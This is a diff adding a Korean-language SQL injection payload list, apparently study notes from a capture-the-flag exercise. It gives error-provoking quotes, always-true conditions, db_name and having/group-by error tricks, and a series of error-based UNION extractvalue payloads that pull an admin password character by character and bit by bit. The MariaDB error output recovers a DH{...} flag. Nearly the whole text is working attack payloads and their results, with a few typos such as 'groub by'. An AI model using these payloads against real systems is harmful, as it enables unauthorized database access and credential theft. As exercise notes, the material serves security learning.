@@ -1,1 +1,59 @@
+Payload
+--------------------------
+-> Syntax Error 유발시켜서, 이를 통해 DB 구조나 내용 추론이 가능한지 확인
+' or " 
 
+-> 쿼리를 강제로 참으로 만들어
+' or 1=1#
+' or 1=1 --
+
+-> 문자열인 DB명을 숫자형으로 비교하여 에러 유발시켜서 데이터베이스 명 확인 가능
+' and db_name() > 1#
+' and db_name() > 1 --
+
+-> having 구문은 반드시 앞에 groub by를 작성해야 하는데 사용하지 않아 강제로 에러 유발, 테이블.컬럼명 확인 가능
+' having 1=1#
+' having 1=1 --
+
+-> 얻어낸 컬럼명을 계속해서 확인 및 추출
+' groub by [컬럼명]#
+' groub by [컬럼명],[컬럼명],... --
+
+-> extractvalue의 두번째 인자를 올바르지 않은 형태로 작, DB 정보를 확인할 수 있다(DB version)
+' UNION SELECT extractvalue(1, concat(0x3a, version()))#
+(1105, "XPATH syntax error: ':10.3.39-MariaDB-0+deb10u1'")
+
+' UNION SELECT extractvalue(1, concat(0x3a, (SELECT DATABASE())))#
+(1105, "XPATH syntax error: ':users'")
+
+' UNION SELECT extractvalue(1, concat(0x3a, (SELECT LENGTH(upw) FROM user WHERE uid='admin')))#
+(1105, "XPATH syntax error: ':44'")
+
+' UNION SELECT extractvalue(1, concat(0x3a, (SELECT substr(upw,1,1)='D' from user WHERE uid='admin')))#
+(1105, "XPATH syntax error: ':1'")
+
+-> 비트 연산을 통한 Error-based & UNION 절 활용
+' UNION SELECT extractvalue(1, concat(0x3a, (SELECT substr(bin(ord(upw)),1,1)=1 from user WHERE uid='admin')))#
+(1105, "XPATH syntax error: ':1'")
+' UNION SELECT extractvalue(1, concat(0x3a, (SELECT substr(bin(ord(upw)),2,1)=1 from user WHERE uid='admin')))#
+(1105, "XPATH syntax error: ':0'")
+' UNION SELECT extractvalue(1, concat(0x3a, (SELECT substr(bin(ord(upw)),3,1)=1 from user WHERE uid='admin')))#
+(1105, "XPATH syntax error: ':0'")
+' UNION SELECT extractvalue(1, concat(0x3a, (SELECT substr(bin(ord(upw)),4,1)=1 from user WHERE uid='admin')))#
+(1105, "XPATH syntax error: ':0'")
+' UNION SELECT extractvalue(1, concat(0x3a, (SELECT substr(bin(ord(upw)),5,1)=1 from user WHERE uid='admin')))#
+(1105, "XPATH syntax error: ':1'")
+' UNION SELECT extractvalue(1, concat(0x3a, (SELECT substr(bin(ord(upw)),6,1)=1 from user WHERE uid='admin')))#
+(1105, "XPATH syntax error: ':0'")
+' UNION SELECT extractvalue(1, concat(0x3a, (SELECT substr(bin(ord(upw)),7,1)=1 from user WHERE uid='admin')))#
+(1105, "XPATH syntax error: ':0'")
+: 1000100 = (2^6) * (2^2) = 68('D')
+
+-> Binary Searcy를 통한 탐색
+' UNION SELECT extractvalue(1, concat(0x3a, (SELECT ascii(substr(upw,1,1))=68 FROM user WHERE uid='admin')))#
+(1105, "XPATH syntax error: ':1'")
+
+' UNION SELECT extractvalue(1, concat(0x3a, (SELECT upw FROM user WHERE uid='admin')))#
+(1105, "XPATH syntax error: ':DH{c3968c78840750168774ad951...'")
+' UNION SELECT extractvalue(1, concat(0x3a, (SELECT substr(upw,20,45) FROM user WHERE uid='admin')))#
+(1105, "XPATH syntax error: ':8774ad951fc98bf788563c4d}'")
